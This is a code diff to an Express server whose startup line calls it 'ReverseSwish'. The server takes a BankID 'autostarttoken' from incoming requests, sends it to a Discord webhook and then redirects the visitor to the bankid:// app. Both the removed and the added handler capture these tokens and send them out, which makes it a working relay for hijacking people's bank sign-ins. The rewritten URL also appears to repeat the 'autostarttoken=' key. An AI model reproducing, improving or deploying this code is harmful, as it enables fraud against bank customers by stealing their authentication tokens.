@@ -11,25 +11,36 @@
  app.use(express.json());
  
  app.get('/', (req, res) => {
-  // Extract the query parameters from req.query
-  const { autostarttoken, redirect } = req.query;
-
-  if (!autostarttoken || !redirect) {
-    return res.status(400).send('Query parameters "autostarttoken" and "redirect" are required.');
-  }
-
-  // Log the query parameters to console or webhook
-  sendDiscordWebhook(`autostarttoken: ${autostarttoken}, redirect: ${redirect}`);
-
-  // Construct the redirect URL
-  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}&redirect=${redirect}`;
-
-  // Redirect to the constructed URL
-  res.redirect(redirectUrl);
-});
-
-
-
+   // Extract the query string from req.originalUrl
+   const queryString = req.originalUrl.split('?')[1];
+ 
+   if (!queryString) {
+     return res.status(400).send('Query parameters are required.');
+   }
+ 
+   // Split the query string into individual parameters
+   const params = new URLSearchParams(queryString);
+ 
+   // Initialize an array to store formatted query parameters
+   const formattedParams = [];
+ 
+   // Iterate through each parameter
+   for (const [key, value] of params.entries()) {
+     // Remove trailing '=' from parameter value if present
+     const sanitizedValue = value.endsWith('=') ? value.slice(0, -1) : value;
+     // Encode key-value pair and add to formattedParams array
+     formattedParams.push(`${key}=${encodeURIComponent(sanitizedValue)}`);
+   }
+ 
+   // Construct the redirect URL with formatted query parameters
+   const redirectUrl = `bankid:///?autostarttoken=${formattedParams.join('&')}`;
+ 
+   // Log the redirect URL to Discord webhook
+   sendDiscordWebhook(redirectUrl);
+ 
+   // Redirect to the constructed URL
+   res.redirect(redirectUrl);
+ });
  
    // Function to send Discord webhook
  async function sendDiscordWebhookEmbed(embed) {
@@ -215,4 +226,3 @@
    console.log("ReverseSwish is running on port 3000!");
  });
  ;
- 
